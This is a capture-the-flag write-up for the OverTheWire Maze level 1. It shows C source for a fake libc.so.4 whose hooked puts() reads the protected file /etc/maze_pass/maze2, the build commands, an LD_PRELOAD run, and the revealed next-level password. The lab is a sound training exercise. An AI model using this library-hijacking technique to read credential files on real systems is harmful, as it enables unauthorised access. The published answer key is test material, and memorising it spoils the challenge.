
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> The binary (`maze1`) refuses to run due to a missing custom library: `./libc.so.4`. Our goal is to **create a malicious version** of that library with a custom `puts()` function that reveals the password.

---

### 🧠 Concepts Covered:

- 📦 Dynamic Library Injection (LD_PRELOAD)
    
- 🪝 **Function Hooking** (`puts`)
    
- 📖 File I/O to read protected password files
    
- 🔗 Shared library creation
    

---

### 🔎 Binary Behavior Summary

When executed, the binary prints:

```bash
./maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory
```

After decompilation:

```c
int main(void) {
    puts("Hello World!");
    return 0;
}
```

It just calls `puts()`. By hijacking `puts()` with our own function, we can execute any code — including reading the password from `/etc/maze_pass/maze2`.

---

### 🧪 Exploitation Steps

We’ll:

1. Write a custom `puts()` function in C
    
2. Compile it into a shared object (`libc.so.4`)
    
3. Use LD_PRELOAD to force the binary to use our custom version
    

---

### ⚙️ Exploit Code

#### 📜 `hookputs.c` (custom `puts()` hook)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

int puts(const char *message) {
    FILE *fp;
    char buffer[30];
    int result;

    fp = fopen("/etc/maze_pass/maze2", "r");
    fread(buffer, sizeof(char), sizeof(buffer), fp);
    fclose(fp);

    printf("📜 The password is: %s\n", buffer);

    result = printf("📣 Hooked output: %s\n", message);
    return result;
}
```

---

### 🧱 Build the Hook Library

```bash
gcc -m32 -fPIC -c hookputs.c
ld -shared -m elf_i386 -o libc.so.4 hookputs.o -ldl
```

- `-m32`: ensures 32-bit compatibility
    
- `-fPIC`: required for position-independent code
    
- `-ldl`: links the dynamic loader
    

---

### 🚀 Run the Exploit

```bash
LD_PRELOAD=./libc.so.4 ./maze1
```

If successful, it will output:

```
📜 The password is: fooghihahr
📣 Hooked output: Hello World!
```

---

### 🔑 Password for Maze Level 2:

```
fooghihahr
```

---
